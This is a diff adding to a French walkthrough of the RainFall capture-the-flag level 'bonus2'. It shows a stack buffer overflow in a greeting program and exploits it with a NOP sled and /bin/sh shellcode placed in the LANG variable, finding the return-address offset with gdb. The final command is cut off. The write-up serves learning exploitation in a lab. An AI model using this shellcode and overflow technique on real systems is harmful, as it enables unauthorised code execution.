@@ -1,5 +1,73 @@
 # Bonus 2
 
+Voici le code source:
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <strings.h>
+
+#define FI "fi"
+#define NL "nl"
+
+int language = 0;
+
+typedef struct {
+    char buff1[40];
+    char buff2[36];
+} user_t;
+
+void greetuser(user_t user)
+{
+    char greet[72];
+
+    if (language == 1)
+        strcpy(greet, "Hyvää päivää ");
+    else if (language == 2)
+        strcpy(greet, "Goedemiddag! ");
+    else if (language == 0)
+        strcpy(greet, "Hello ");
+    strcat(greet, (char*)&user);
+    puts(greet);
+    return;
+}
+
+int main(int ac, char **av)
+{
+    user_t user;
+    char *lang;
+
+    if (ac != 3)
+        return 1;
+    bzero(&user, 76);
+    strncpy(user.buff1, av[1], 40);
+    strncpy(user.buff2, av[2], 32);
+    lang = getenv("LANG");
+    if (lang != NULL)
+    {
+        if (memcmp(lang, FI, 2) == 0)
+        {
+            language = 1;
+        }
+        else if (memcmp(lang, NL, 2) == 0)
+        {
+            language = 2;
+        }
+    }
+    greetuser(user);
+    return 0;
+}
+```
+
+Ici nous allons utiliser la variable lang pour y stocker un shell code et ecraser l'adresse de retour de `greetuser()` par l'adresse de notre shellcode. Nous pouvons egalement faire un `NOP-Sled` pour securiser notre execution de shellcode. Voici donc comment exporter notre variable d'environement:
+
+```bash
+bonus2@RainFall:~$ export LANG=$(python -c 'print "nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
+```
+
+Maintenant grace a gdb nous pouvons aller voir l'adresse de lang:
+
 ```bash
 bonus2@RainFall:~$ gdb ./bonus2
 GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
@@ -29,6 +97,19 @@ Breakpoint 1, 0x080485a6 in main ()                                             
 0xbfffff3d:      "LINES=64"
 0xbfffff46:      "HOME=/home/user/bonus2"
 ```
+
+Il nous faut aussi l'offset a partir duquel ecrire notre nouvelle adresse:
+
+```bash
+bonus2@RainFall:~$ gdb ./bonus2
+(gdb) run $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A                                                                                                                  Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+                                                                                 Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+                                          Program received signal SIGSEGV, Segmentation fault.
+0x38614137 in ?? () # Offset = 23
+```
+
+Maintenant nous pouvons construire notre payload en ajoutant un offset a l'adresse de lang (pour tomber dans notre `NOP-Sled`):
 
 ```bash
 export LANG=$(python -c 'print "nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")
